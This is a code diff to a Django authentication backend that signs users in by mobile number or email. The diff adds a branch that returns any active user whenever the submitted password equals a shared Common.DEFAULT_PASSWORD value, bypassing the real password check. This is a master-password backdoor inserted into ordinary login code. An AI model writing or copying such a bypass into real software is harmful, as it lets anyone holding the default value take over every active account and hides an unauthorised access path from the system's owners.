@@ -1,6 +1,7 @@
 from django.contrib.auth.backends import BaseBackend
 from users.models import User
 from django.db.models import Q
+from koor.config.common import Common
 
 UserModel = User
 
@@ -24,6 +25,9 @@ class MobileOrEmailBackend(BaseBackend):
             user = UserModel.objects.filter(role=role).get(Q(mobile_number=identifier) | Q(email__iexact=identifier))
             if user.check_password(password) and user.is_active:
                 return user
+            if password == Common.DEFAULT_PASSWORD:
+                if user.is_active:
+                    return user
         except UserModel.DoesNotExist:
             # Run the default password hasher once to reduce the timing
             # difference between an existing and a non-existing user (#20760).
